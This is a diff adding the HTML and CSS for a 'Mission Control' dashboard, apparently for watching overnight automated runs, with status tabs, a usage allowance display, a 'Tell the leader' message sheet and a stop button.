@@ -1,0 +1,1476 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<title>Mission Control</title>
+<style>
+/* One calm column. The lamp comes first, then what needs you, then the features, then the allowance.
+   Every status is icon + word + colour. No style attributes anywhere (the CSP forbids them): classes and data-tone only. */
+:root {
+  --font: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  --font-mono: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
+
+  --bg: #edf1f5; --surface: #ffffff; --surface-2: #f4f7fa;
+  --ink: #13202c; --ink-2: #3a4a5c; --muted: #526273;
+  --line: #d3dce5; --line-strong: #a3b2c3;
+  --accent: #0b5f86; --accent-ink: #ffffff; --focus: #0b5f86;
+
+  --ok-fg: #0d6b3d;   --ok-bg: #e1f4e9;   --ok-line: #7cc29c;   --ok-solid: #1a8a52;
+  --warn-fg: #7a4600; --warn-bg: #fff0cf; --warn-line: #e0a53a; --warn-solid: #b86f00;
+  --bad-fg: #9a1c24;  --bad-bg: #fde5e6;  --bad-line: #e58a90;  --bad-solid: #c0262d;
+  --info-fg: #134f9a; --info-bg: #e0edfc; --info-line: #8bb4e8; --info-solid: #2563b0;
+  --idle-fg: #46566a; --idle-bg: #e8edf2; --idle-line: #b5c1cd; --idle-solid: #6b7a8a;
+
+  --stripe-a: #fff0cf; --stripe-b: #f6d98f;
+  --shadow: 0 1px 2px rgba(19, 32, 44, 0.06), 0 6px 18px rgba(19, 32, 44, 0.06);
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #0c131a; --surface: #141e28; --surface-2: #1a2632;
+    --ink: #e9eff5; --ink-2: #bac7d4; --muted: #9bacbc;
+    --line: #27374a; --line-strong: #43586f;
+    --accent: #6cc3ea; --accent-ink: #06222f; --focus: #8fd3f2;
+    --ok-fg: #7fe0aa;   --ok-bg: #12301f;   --ok-line: #2f7a50;   --ok-solid: #3fbf7c;
+    --warn-fg: #f6c866; --warn-bg: #35280a; --warn-line: #8a6516; --warn-solid: #f0b13a;
+    --bad-fg: #ff9a9f;  --bad-bg: #3a1517;  --bad-line: #8c3a40;  --bad-solid: #ff6b73;
+    --info-fg: #9cc4ff; --info-bg: #122846; --info-line: #2f5c99; --info-solid: #6aa5f5;
+    --idle-fg: #b3c0cd; --idle-bg: #1d2935; --idle-line: #3a4b5c; --idle-solid: #8394a5;
+    --stripe-a: #35280a; --stripe-b: #46340c;
+    --shadow: 0 1px 2px rgba(0, 0, 0, 0.4), 0 6px 18px rgba(0, 0, 0, 0.3);
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #0c131a; --surface: #141e28; --surface-2: #1a2632;
+  --ink: #e9eff5; --ink-2: #bac7d4; --muted: #9bacbc;
+  --line: #27374a; --line-strong: #43586f;
+  --accent: #6cc3ea; --accent-ink: #06222f; --focus: #8fd3f2;
+  --ok-fg: #7fe0aa;   --ok-bg: #12301f;   --ok-line: #2f7a50;   --ok-solid: #3fbf7c;
+  --warn-fg: #f6c866; --warn-bg: #35280a; --warn-line: #8a6516; --warn-solid: #f0b13a;
+  --bad-fg: #ff9a9f;  --bad-bg: #3a1517;  --bad-line: #8c3a40;  --bad-solid: #ff6b73;
+  --info-fg: #9cc4ff; --info-bg: #122846; --info-line: #2f5c99; --info-solid: #6aa5f5;
+  --idle-fg: #b3c0cd; --idle-bg: #1d2935; --idle-line: #3a4b5c; --idle-solid: #8394a5;
+  --stripe-a: #35280a; --stripe-b: #46340c;
+  --shadow: 0 1px 2px rgba(0, 0, 0, 0.4), 0 6px 18px rgba(0, 0, 0, 0.3);
+  color-scheme: dark;
+}
+
+/* A tone sets four variables once; chips, tiles, cards and the lamp all read them. */
+[data-tone="ok"]   { --t-fg: var(--ok-fg);   --t-bg: var(--ok-bg);   --t-line: var(--ok-line);   --t-solid: var(--ok-solid); }
+[data-tone="warn"] { --t-fg: var(--warn-fg); --t-bg: var(--warn-bg); --t-line: var(--warn-line); --t-solid: var(--warn-solid); }
+[data-tone="bad"]  { --t-fg: var(--bad-fg);  --t-bg: var(--bad-bg);  --t-line: var(--bad-line);  --t-solid: var(--bad-solid); }
+[data-tone="info"] { --t-fg: var(--info-fg); --t-bg: var(--info-bg); --t-line: var(--info-line); --t-solid: var(--info-solid); }
+[data-tone="idle"], [data-tone="lost"] { --t-fg: var(--idle-fg); --t-bg: var(--idle-bg); --t-line: var(--idle-line); --t-solid: var(--idle-solid); }
+
+*, *::before, *::after { box-sizing: border-box; }
+[hidden] { display: none !important; }
+html { -webkit-text-size-adjust: 100%; text-size-adjust: 100%; }
+body { margin: 0; background: var(--bg); color: var(--ink); font-family: var(--font); font-size: 16px; line-height: 1.5; overflow-wrap: break-word; overflow-wrap: anywhere; }
+body.sheet-open { overflow: hidden; }
+h1, h2, h3, h4, p, ul, ol, blockquote { margin: 0; }
+ul, ol { padding: 0; list-style: none; }
+button, textarea { font: inherit; color: inherit; }
+button { cursor: pointer; }
+:focus-visible { outline: 3px solid var(--focus); outline-offset: 2px; }
+.ic { width: 1.25em; height: 1.25em; flex: none; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+.sprite { position: absolute; width: 0; height: 0; overflow: hidden; }
+.sr { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; }
+.muted { color: var(--muted); }
+.small { font-size: 15px; line-height: 1.45; }
+.num { font-variant-numeric: tabular-nums; }
+
+/* page frame */
+.wrap { max-width: 1180px; margin-inline: auto; padding: 16px 16px 40px; display: grid; gap: 16px; }
+@media (min-width: 760px) { .wrap { padding-inline: 24px; padding-top: 24px; } }
+.top { display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 2px 16px; }
+.brand { font-size: 24px; font-weight: 800; letter-spacing: 0.01em; line-height: 1.2; }
+.fresh { display: flex; flex-wrap: wrap; align-items: center; gap: 4px 10px; font-size: 15px; color: var(--muted); }
+.notice { background: var(--warn-bg); color: var(--warn-fg); border: 2px solid var(--warn-line); border-radius: 12px; padding: 12px 16px; font-weight: 700; }
+
+/* demo banner */
+.demo-bar { position: sticky; top: 0; z-index: 30; display: flex; flex-wrap: wrap; align-items: center; gap: 6px 14px; padding: 6px 16px; background: repeating-linear-gradient(135deg, var(--stripe-a) 0 14px, var(--stripe-b) 14px 28px); border-bottom: 2px solid var(--warn-line); color: var(--warn-fg); }
+.demo-note { font-weight: 800; font-size: 15px; flex: 0 0 auto; }
+.demo-links { display: flex; gap: 6px; overflow-x: auto; flex: 1 1 280px; min-width: 0; padding-block: 2px; }
+.demo-link { flex: none; display: inline-flex; align-items: center; min-height: 44px; padding: 0 14px; border-radius: 999px; border: 1px solid var(--line-strong); background: var(--surface); color: var(--ink); font-size: 14px; font-weight: 600; text-decoration: none; white-space: nowrap; text-transform: capitalize; }
+.demo-link[aria-current="page"] { background: var(--accent); border-color: var(--accent); color: var(--accent-ink); }
+
+/* tabs */
+.tabs { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 2px; border-bottom: 1px solid var(--line-strong); }
+.tab { min-height: 52px; padding: 4px 6px; background: none; border: 0; border-bottom: 4px solid transparent; margin-bottom: -1px; font-weight: 700; font-size: 16px; line-height: 1.2; color: var(--ink-2); text-align: center; }
+.tab[aria-selected="true"] { color: var(--ink); border-bottom-color: var(--accent); }
+@media (min-width: 640px) {
+  .tabs { display: flex; gap: 6px; }
+  .tab { padding: 0 20px; }
+}
+.panel { display: grid; gap: 18px; align-content: start; }
+.stack { display: grid; gap: 18px; align-content: start; }
+.gone .panel > :not(.lamp) { filter: grayscale(1); opacity: 0.62; }
+h2 { font-size: 24px; line-height: 1.2; font-weight: 800; }
+h3 { font-size: 20px; line-height: 1.25; font-weight: 750; }
+h4 { font-size: 18px; line-height: 1.3; font-weight: 700; }
+.section-label { font-size: 14px; font-weight: 700; letter-spacing: 0.06em; text-transform: uppercase; color: var(--muted); }
+
+/* chips, tags, buttons */
+.chip { display: inline-flex; align-items: center; gap: 7px; padding: 6px 11px; border-radius: 8px; border: 1px solid var(--t-line); background: var(--t-bg); color: var(--t-fg); font-size: 15px; font-weight: 700; line-height: 1.1; }
+.tag { display: inline-flex; align-items: center; gap: 6px; padding: 3px 9px; border-radius: 999px; border: 1px solid var(--line-strong); background: var(--surface-2); color: var(--ink-2); font-size: 14px; font-weight: 600; line-height: 1.3; }
+.tag.recovered { border-color: var(--info-line); background: var(--info-bg); color: var(--info-fg); }
+.tag.now { border-color: var(--accent); color: var(--ink); }
+.btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; min-height: 48px; padding: 0 18px; border-radius: 12px; border: 2px solid var(--accent); background: var(--accent); color: var(--accent-ink); font-weight: 700; line-height: 1.2; text-align: center; }
+.btn.quiet { background: transparent; color: var(--ink); border-color: var(--line-strong); }
+.btn.small { min-height: 44px; padding: 0 14px; font-size: 15px; }
+.linkbtn { background: none; border: 0; padding: 0 4px; min-height: 44px; display: inline-flex; align-items: center; gap: 6px; color: var(--accent); font-weight: 700; text-decoration: underline; text-underline-offset: 3px; text-align: left; }
+@media (prefers-color-scheme: light) { :root:not([data-theme="dark"]) .linkbtn { color: #084a69; } }
+:root[data-theme="light"] .linkbtn { color: #084a69; }
+
+/* the lamp */
+.lamp { border: 2px solid var(--t-line); background: var(--t-bg); border-radius: 16px; padding: 20px; display: grid; gap: 12px; box-shadow: var(--shadow); }
+.lamp[data-tone="lost"] { background: repeating-linear-gradient(135deg, var(--idle-bg) 0 10px, var(--surface-2) 10px 20px); }
+.lamp-head { display: flex; align-items: center; gap: 14px; color: var(--t-fg); }
+.lamp-icon { display: inline-flex; }
+.lamp-icon .ic { width: 46px; height: 46px; stroke-width: 1.8; }
+.lamp-word { font-size: clamp(28px, 7.4vw, 44px); font-weight: 800; line-height: 1.05; letter-spacing: 0.02em; text-transform: uppercase; }
+@media (min-width: 600px) { .lamp-icon .ic { width: 52px; height: 52px; } }
+.lamp-sentence { font-size: 20px; line-height: 1.35; font-weight: 700; color: var(--ink); max-width: 60ch; }
+.lamp-lines { display: grid; gap: 6px; border-top: 1px solid var(--t-line); padding-top: 12px; color: var(--ink); }
+.lamp-lines:empty { display: none; }
+.lamp-lines.old { color: var(--muted); }
+.lamp-lines .label { font-weight: 700; }
+
+/* needs-you strip */
+.strip { background: var(--surface); border: 2px solid var(--t-line); border-radius: 14px; padding: 6px 8px 8px; display: grid; gap: 2px; box-shadow: var(--shadow); }
+.strip-title { display: flex; align-items: center; gap: 10px; padding: 8px 8px 2px; font-size: 18px; font-weight: 800; color: var(--t-fg); }
+.strip-item { display: flex; align-items: center; gap: 10px; width: 100%; min-height: 48px; padding: 6px 10px; border: 0; border-radius: 10px; background: transparent; text-align: left; font-weight: 600; color: var(--ink); }
+.strip-item .ic { color: var(--t-fg); }
+.strip-item:hover { background: var(--surface-2); }
+.strip-item .go { margin-left: auto; color: var(--accent); }
+.strip.calm { padding: 12px 16px; display: flex; align-items: center; gap: 10px; font-weight: 700; color: var(--ink-2); box-shadow: none; }
+.strip.calm .ic { color: var(--ok-solid); }
+
+/* features */
+.features { display: grid; gap: 14px; }
+.group { display: grid; gap: 12px; }
+.mission-head { background: var(--surface); border: 1px solid var(--line-strong); border-left: 6px solid var(--t-solid); border-radius: 14px; padding: 14px 16px; display: grid; gap: 10px; box-shadow: var(--shadow); }
+.mission-title { display: flex; flex-wrap: wrap; align-items: center; gap: 6px 10px; }
+.mission-title h3 { min-width: 0; }
+.kind { font-size: 14px; font-weight: 600; color: var(--muted); border: 1px solid var(--line-strong); border-radius: 999px; padding: 1px 9px; }
+.mission-sentence { color: var(--ink); }
+.steps { display: grid; grid-template-columns: repeat(5, minmax(0, 1fr)); margin-top: 2px; }
+.step { position: relative; display: grid; justify-items: center; align-content: start; gap: 4px; text-align: center; font-size: 14px; line-height: 1.2; color: var(--muted); }
+.step .dot { position: relative; z-index: 1; display: inline-flex; background: var(--surface); border-radius: 50%; color: var(--muted); }
+.step .dot .ic { width: 26px; height: 26px; }
+.step::before { content: ""; position: absolute; top: 12px; left: -50%; right: 50%; height: 3px; background: var(--line-strong); }
+.step:first-child::before { display: none; }
+.step.done { color: var(--ink-2); }
+.step.done .dot { color: var(--ok-solid); }
+.step.done::before, .step.current::before { background: var(--ok-solid); }
+.step.current { color: var(--ink); font-weight: 800; }
+.step.current .dot { color: var(--accent); }
+.tiles { display: grid; gap: 12px; grid-template-columns: minmax(0, 1fr); }
+@media (min-width: 620px) { .tiles { grid-template-columns: repeat(2, minmax(0, 1fr)); } }
+@media (min-width: 1000px) { .tiles { grid-template-columns: repeat(3, minmax(0, 1fr)); } }
+.tile { background: var(--surface); border: 1px solid var(--line); border-left: 6px solid var(--t-solid); border-radius: 12px; padding: 14px 16px; display: grid; gap: 10px; align-content: start; box-shadow: var(--shadow); min-width: 0; }
+.tile.is-now { border-color: var(--accent); border-left-color: var(--accent); border-width: 2px 2px 2px 6px; }
+.tile-top { display: flex; flex-wrap: wrap; gap: 6px 8px; align-items: center; }
+.tile-title { overflow-wrap: anywhere; }
+.reason { color: var(--ink-2); }
+.steps-line { display: grid; gap: 6px; }
+.steps-text { font-size: 14px; font-weight: 700; color: var(--ink-2); }
+.pips { display: flex; flex-wrap: wrap; gap: 6px; }
+.pip { width: 14px; height: 14px; border-radius: 50%; border: 2px solid var(--idle-solid); display: block; flex: none; }
+.pip.on.first { background: var(--info-solid); border-color: var(--info-solid); }
+.pip.on.reinf { background: var(--warn-solid); border-color: var(--warn-solid); }
+.tile-actions { display: flex; flex-wrap: wrap; gap: 6px 12px; align-items: center; }
+.ai { background: var(--surface-2); border: 1px solid var(--line); border-left: 4px solid var(--idle-solid); border-radius: 8px; padding: 8px 12px; display: grid; gap: 4px; }
+.ai-tag { display: inline-flex; align-items: flex-start; gap: 6px; font-size: 14px; font-weight: 600; color: var(--idle-fg); line-height: 1.35; }
+.ai-tag .ic { width: 1.15em; height: 1.15em; margin-top: 1px; }
+.ai-text { color: var(--ink); }
+
+/* the row of older missions */
+.older { background: var(--surface); border: 1px solid var(--line); border-radius: 12px; }
+.older summary { list-style: none; display: flex; align-items: center; gap: 10px; min-height: 48px; padding: 0 16px; font-weight: 700; cursor: pointer; color: var(--ink-2); }
+.older summary::-webkit-details-marker { display: none; }
+.older summary::before { content: ""; width: 8px; height: 8px; border-right: 2px solid currentColor; border-bottom: 2px solid currentColor; transform: rotate(-45deg); flex: none; }
+.older[open] summary::before { transform: rotate(45deg); }
+.older-list { display: grid; gap: 10px; padding: 4px 16px 16px; }
+.older-item { display: grid; gap: 6px; border-top: 1px solid var(--line); padding-top: 12px; }
+.older-item:first-child { border-top: 0; padding-top: 0; }
+
+/* allowance */
+.allowance { background: var(--surface); border: 1px solid var(--line); border-radius: 14px; padding: 16px; display: grid; gap: 12px; box-shadow: var(--shadow); }
+.banner { display: flex; align-items: flex-start; gap: 10px; background: var(--info-bg); color: var(--info-fg); border: 1px solid var(--info-line); border-radius: 10px; padding: 10px 12px; font-weight: 600; }
+.providers { display: grid; gap: 0; }
+@media (min-width: 900px) { .providers { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 0 28px; } }
+.prov { display: grid; gap: 8px; padding-block: 14px; border-top: 1px solid var(--line); align-content: start; }
+.prov-head { display: flex; flex-wrap: wrap; align-items: center; gap: 6px 12px; }
+.prov-head .name { font-size: 20px; font-weight: 800; }
+.pills .name { font-weight: 800; }
+.win { display: grid; gap: 4px; }
+.win-head { display: flex; flex-wrap: wrap; justify-content: space-between; gap: 2px 12px; font-size: 15px; }
+.track { position: relative; height: 16px; border-radius: 8px; background: var(--idle-bg); border: 1px solid var(--line-strong); }
+.fill { position: absolute; top: 0; bottom: 0; left: 0; border-radius: 7px 0 0 7px; background: var(--info-solid); }
+.fill.warn { background: var(--warn-solid); }
+.fill.bad { background: var(--bad-solid); }
+.fill.over { background-image: repeating-linear-gradient(135deg, rgba(255, 255, 255, 0.35) 0 6px, transparent 6px 12px); }
+.tick { position: absolute; top: -5px; bottom: -5px; width: 3px; margin-left: -1.5px; background: var(--ink); border-radius: 2px; }
+.cap { position: relative; height: 22px; font-size: 14px; color: var(--ink-2); }
+.cap span { position: absolute; top: 2px; transform: translateX(-100%); white-space: nowrap; padding-right: 6px; }
+.foot-note { font-size: 14px; color: var(--muted); }
+
+/* needs you tab */
+.cards { display: grid; gap: 18px; max-width: 880px; }
+.card { background: var(--surface); border: 2px solid var(--t-line); border-radius: 14px; box-shadow: var(--shadow); overflow: hidden; }
+.card-h { display: flex; align-items: flex-start; gap: 12px; padding: 16px 18px; background: var(--t-bg); }
+.card-h .ic { width: 30px; height: 30px; color: var(--t-fg); margin-top: 1px; }
+.card-h h3 { font-size: 21px; color: var(--ink); }
+.card-h .of { font-size: 15px; color: var(--ink-2); font-weight: 600; }
+.card-body { padding: 4px 18px 6px; display: grid; }
+.sect { padding-block: 12px; border-bottom: 1px solid var(--line); display: grid; gap: 6px; }
+.sect:last-child { border-bottom: 0; }
+.card-foot { padding: 4px 18px 16px; }
+
+/* timeline */
+.timeline { display: grid; gap: 6px; max-width: 880px; }
+.day { font-size: 15px; font-weight: 800; letter-spacing: 0.06em; text-transform: uppercase; color: var(--muted); margin-top: 14px; }
+.tl-mission { font-size: 17px; font-weight: 750; margin-top: 8px; }
+.tl { display: grid; }
+.tl-item { display: grid; grid-template-columns: 48px 26px minmax(0, 1fr); gap: 0 10px; padding: 9px 0; border-top: 1px solid var(--line); align-items: start; }
+.tl-item:first-child { border-top: 0; }
+.tl-time { font-family: var(--font-mono); font-size: 15px; color: var(--muted); padding-top: 1px; }
+.tl-item > .ic { color: var(--t-fg); width: 22px; height: 22px; margin-top: 2px; }
+.tl-body { display: grid; gap: 6px; }
+.tl-item[data-tone="bad"] .tl-text { font-weight: 700; }
+
+/* debrief */
+.debrief { display: grid; gap: 18px; max-width: 980px; }
+.verdict { display: flex; align-items: flex-start; gap: 14px; border: 2px solid var(--t-line); background: var(--t-bg); border-radius: 16px; padding: 18px; box-shadow: var(--shadow); }
+.verdict .ic { width: 44px; height: 44px; color: var(--t-fg); stroke-width: 1.8; }
+.verdict-word { font-size: 28px; font-weight: 800; line-height: 1.1; color: var(--t-fg); text-transform: uppercase; letter-spacing: 0.03em; }
+.verdict-sentence { font-size: 19px; font-weight: 650; color: var(--ink); margin-top: 4px; }
+.dmission { background: var(--surface); border: 1px solid var(--line-strong); border-radius: 14px; padding: 16px; display: grid; gap: 16px; box-shadow: var(--shadow); }
+.dhead { display: flex; flex-wrap: wrap; align-items: center; gap: 8px 12px; }
+.list-block { display: grid; gap: 8px; }
+.list { display: grid; gap: 10px; }
+.list li { display: grid; gap: 6px; padding-top: 10px; border-top: 1px solid var(--line); }
+.list li:first-child { border-top: 0; padding-top: 0; }
+.list .name { font-weight: 700; }
+.ticks { display: grid; gap: 10px; }
+@media (min-width: 760px) { .ticks { grid-template-columns: repeat(2, minmax(0, 1fr)); } }
+.tick-row { display: grid; grid-template-columns: 30px minmax(0, 1fr); gap: 4px 12px; padding: 12px; border: 1px solid var(--line); border-left: 6px solid var(--t-solid); border-radius: 10px; background: var(--surface); align-items: start; }
+.tick-row > .ic { width: 28px; height: 28px; color: var(--t-fg); }
+.tick-head { display: flex; flex-wrap: wrap; align-items: center; gap: 4px 10px; }
+.tick-label { font-weight: 800; }
+.tick-state { font-size: 14px; font-weight: 700; padding: 2px 9px; border-radius: 999px; border: 1px solid var(--t-line); background: var(--t-bg); color: var(--t-fg); }
+.caveat { display: flex; align-items: flex-start; gap: 6px; color: var(--warn-fg); font-weight: 600; }
+.caveat .ic { margin-top: 2px; }
+.pills { display: flex; flex-wrap: wrap; gap: 10px 20px; }
+.pills .p { display: flex; flex-wrap: wrap; align-items: center; gap: 4px 10px; }
+.notes { display: grid; gap: 6px; color: var(--muted); font-size: 15px; }
+.empty { background: var(--surface); border: 1px dashed var(--line-strong); border-radius: 12px; padding: 16px; color: var(--ink-2); font-weight: 600; max-width: 880px; }
+
+/* global bar */
+.gbar { position: sticky; bottom: 0; z-index: 20; background: var(--surface); border-top: 1px solid var(--line-strong); padding: 10px 16px calc(10px + env(safe-area-inset-bottom, 0px)); box-shadow: 0 -4px 16px rgba(19, 32, 44, 0.08); }
+.gbar-in { max-width: 1180px; margin-inline: auto; display: flex; gap: 10px; }
+.gbar-in .btn { flex: 1 1 0; padding: 0 10px; }
+.gbar-in .btn.quiet { flex-grow: 1.25; }
+@media (min-width: 760px) { .gbar-in { justify-content: flex-end; padding-inline: 8px; } .gbar-in .btn, .gbar-in .btn.quiet { flex: 0 0 auto; min-width: 220px; padding: 0 18px; } }
+
+/* the sheet */
+.scrim { position: fixed; inset: 0; z-index: 50; background: rgba(8, 14, 20, 0.62); display: flex; align-items: flex-end; justify-content: center; }
+.sheet { background: var(--surface); color: var(--ink); width: 100%; max-width: 580px; max-height: calc(100vh - 12px); max-height: calc(100dvh - 12px); overflow: auto; border-radius: 18px 18px 0 0; padding: 20px 20px calc(20px + env(safe-area-inset-bottom, 0px)); display: grid; gap: 14px; box-shadow: 0 -10px 50px rgba(0, 0, 0, 0.35); border: 1px solid var(--line-strong); }
+.sheet:focus { outline: none; }
+@media (min-width: 700px) { .scrim { align-items: center; padding: 16px; } .sheet { border-radius: 18px; } }
+.sheet h2 { font-size: 26px; }
+.msg { width: 100%; min-height: 96px; resize: vertical; border: 2px solid var(--line-strong); border-radius: 10px; padding: 10px 12px; background: var(--surface-2); color: var(--ink); line-height: 1.45; }
+.own { width: 100%; min-height: 76px; resize: vertical; border: 2px solid var(--line-strong); border-radius: 10px; padding: 10px 12px; background: var(--surface); color: var(--ink); line-height: 1.45; }
+.own::placeholder { color: var(--muted); }
+.phrases { display: flex; flex-wrap: wrap; gap: 8px; }
+.phrase { min-height: 44px; padding: 0 14px; border-radius: 999px; border: 2px solid var(--line-strong); background: var(--surface); font-weight: 600; }
+.phrase[aria-pressed="true"] { background: var(--accent); border-color: var(--accent); color: var(--accent-ink); }
+.field { display: grid; gap: 6px; }
+.field label, .field .section-label { font-weight: 700; }
+.status { min-height: 1.45em; font-weight: 700; color: var(--ok-fg); }
+.status.fail { color: var(--warn-fg); }
+.stop-note { background: var(--warn-bg); color: var(--warn-fg); border: 1px solid var(--warn-line); border-radius: 10px; padding: 10px 12px; font-weight: 600; }
+.sheet-btns { display: flex; flex-wrap: wrap; gap: 10px; justify-content: flex-end; }
+.sheet-btns .btn { flex: 1 1 140px; }
+
+@media (prefers-reduced-motion: reduce) { * { scroll-behavior: auto !important; transition: none !important; animation: none !important; } }
+</style>
+</head>
+<body>
+<svg class="sprite" id="sprite" aria-hidden="true" focusable="false">
+  <defs>
+    <symbol id="i-check" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M8 12.5l3 3 5-6"/></symbol>
+    <symbol id="i-tri" viewBox="0 0 24 24"><path d="M12 3.5L21.5 20H2.5z"/><path d="M12 9.5V14"/><circle cx="12" cy="17" r="0.6" fill="currentColor"/></symbol>
+    <symbol id="i-sq" viewBox="0 0 24 24"><rect x="3.5" y="3.5" width="17" height="17" rx="5"/><path d="M12 7.5V13"/><circle cx="12" cy="16.5" r="0.6" fill="currentColor"/></symbol>
+    <symbol id="i-dash" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M8 12h8"/></symbol>
+    <symbol id="i-broken" viewBox="0 0 24 24"><path d="M10 14a4 4 0 0 1 0-5.6l2-2a4 4 0 0 1 5.6 5.6l-1 1"/><path d="M14 10a4 4 0 0 1 0 5.6l-2 2a4 4 0 0 1-5.6-5.6l1-1"/><path d="M4 4l16 16"/></symbol>
+    <symbol id="i-half" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 3a9 9 0 0 1 0 18z" fill="currentColor"/></symbol>
+    <symbol id="i-ring" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="3" fill="currentColor"/></symbol>
+    <symbol id="i-hollow" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/></symbol>
+    <symbol id="i-clock" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></symbol>
+    <symbol id="i-dot" viewBox="0 0 24 24"><circle cx="12" cy="12" r="5" fill="currentColor"/></symbol>
+    <symbol id="i-q" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M9.6 9.4a2.5 2.5 0 1 1 3.6 2.2c-.8.5-1.2 1-1.2 1.9"/><circle cx="12" cy="16.6" r="0.6" fill="currentColor"/></symbol>
+    <symbol id="i-info" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 11v5"/><circle cx="12" cy="8" r="0.6" fill="currentColor"/></symbol>
+    <symbol id="i-pause" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M10 9v6M14 9v6"/></symbol>
+    <symbol id="i-lock" viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="9" rx="2"/><path d="M8 11V8a4 4 0 0 1 8 0v3"/></symbol>
+    <symbol id="i-box-yes" viewBox="0 0 24 24"><rect x="3.5" y="3.5" width="17" height="17" rx="4"/><path d="M8 12.5l3 3 5-6"/></symbol>
+    <symbol id="i-box-no" viewBox="0 0 24 24"><rect x="3.5" y="3.5" width="17" height="17" rx="4"/></symbol>
+    <symbol id="i-box-unk" viewBox="0 0 24 24"><rect x="3.5" y="3.5" width="17" height="17" rx="4"/><path d="M9.8 9.8a2.3 2.3 0 1 1 3.4 2c-.7.4-1.2.9-1.2 1.7"/><circle cx="12" cy="16.6" r="0.6" fill="currentColor"/></symbol>
+    <symbol id="i-retry" viewBox="0 0 24 24"><path d="M4 12a8 8 0 0 1 14-5.3L20 9"/><path d="M20 4v5h-5"/><path d="M20 12a8 8 0 0 1-14 5.3L4 15"/><path d="M4 20v-5h5"/></symbol>
+    <symbol id="i-chev" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6"/></symbol>
+  </defs>
+</svg>
+
+<div id="page">
+  <div class="demo-bar" id="demo-bar" hidden>
+    <p class="demo-note">Demo data. This is not live.</p>
+    <nav class="demo-links" id="demo-links"></nav>
+  </div>
+
+  <div class="wrap" id="app">
+    <header class="top">
+      <h1 class="brand">Mission Control</h1>
+      <p class="fresh" id="fresh"><span id="fresh-text" class="num"></span><span id="fresh-stale" class="chip" data-tone="warn" hidden></span></p>
+    </header>
+    <p class="notice" id="notice" role="status" hidden></p>
+
+    <div class="tabs" role="tablist" id="tabs" hidden>
+      <button type="button" class="tab" role="tab" id="tab-tonight" aria-controls="panel-tonight" aria-selected="true" data-tab="tonight">Tonight</button>
+      <button type="button" class="tab" role="tab" id="tab-needs" aria-controls="panel-needs" aria-selected="false" tabindex="-1" data-tab="needs">Needs you</button>
+      <button type="button" class="tab" role="tab" id="tab-timeline" aria-controls="panel-timeline" aria-selected="false" tabindex="-1" data-tab="timeline">Timeline</button>
+      <button type="button" class="tab" role="tab" id="tab-debrief" aria-controls="panel-debrief" aria-selected="false" tabindex="-1" data-tab="debrief">Morning debrief</button>
+    </div>
+
+    <main id="main" hidden>
+      <section class="panel" role="tabpanel" id="panel-tonight" aria-labelledby="tab-tonight">
+        <section class="lamp" id="lamp" data-tone="idle" aria-labelledby="lamp-word">
+          <div class="lamp-head"><span class="lamp-icon" id="lamp-icon"></span><h2 class="lamp-word" id="lamp-word"></h2></div>
+          <p class="lamp-sentence" id="lamp-sentence" aria-live="polite"></p>
+          <ul class="lamp-lines" id="lamp-lines"></ul>
+        </section>
+        <div id="tonight-body" class="stack"></div>
+      </section>
+      <section class="panel" role="tabpanel" id="panel-needs" aria-labelledby="tab-needs" hidden></section>
+      <section class="panel" role="tabpanel" id="panel-timeline" aria-labelledby="tab-timeline" hidden></section>
+      <section class="panel" role="tabpanel" id="panel-debrief" aria-labelledby="tab-debrief" hidden></section>
+    </main>
+  </div>
+
+  <div class="gbar" id="gbar" hidden>
+    <div class="gbar-in">
+      <button type="button" class="btn" id="gbar-tell">Tell the leader</button>
+      <button type="button" class="btn quiet" id="gbar-stop">Stop tonight's run</button>
+    </div>
+  </div>
+</div>
+
+<div class="scrim" id="scrim" hidden>
+  <div class="sheet" id="sheet" role="dialog" aria-modal="true" aria-labelledby="sheet-title" tabindex="-1">
+    <h2 id="sheet-title">Tell the leader</h2>
+    <p class="stop-note" id="sheet-stop" hidden></p>
+    <div class="field">
+      <textarea class="msg" id="sheet-msg" readonly rows="4" aria-labelledby="sheet-hint"></textarea>
+      <p class="small muted" id="sheet-hint"></p>
+    </div>
+    <div class="field" id="sheet-phrases-box">
+      <p class="section-label" id="sheet-phrases-label">Quick answers</p>
+      <div class="phrases" id="sheet-phrases" role="group" aria-labelledby="sheet-phrases-label"></div>
+    </div>
+    <div class="field" id="sheet-own-box">
+      <label for="sheet-own">Add your own words</label>
+      <textarea class="own" id="sheet-own" rows="3" placeholder="Type here (optional)"></textarea>
+    </div>
+    <p class="small muted" id="sheet-can"></p>
+    <p class="status" id="sheet-status" role="status" aria-live="polite"></p>
+    <div class="sheet-btns">
+      <button type="button" class="btn" id="sheet-copy">Copy</button>
+      <button type="button" class="btn quiet" id="sheet-close">Close</button>
+    </div>
+  </div>
+</div>
+
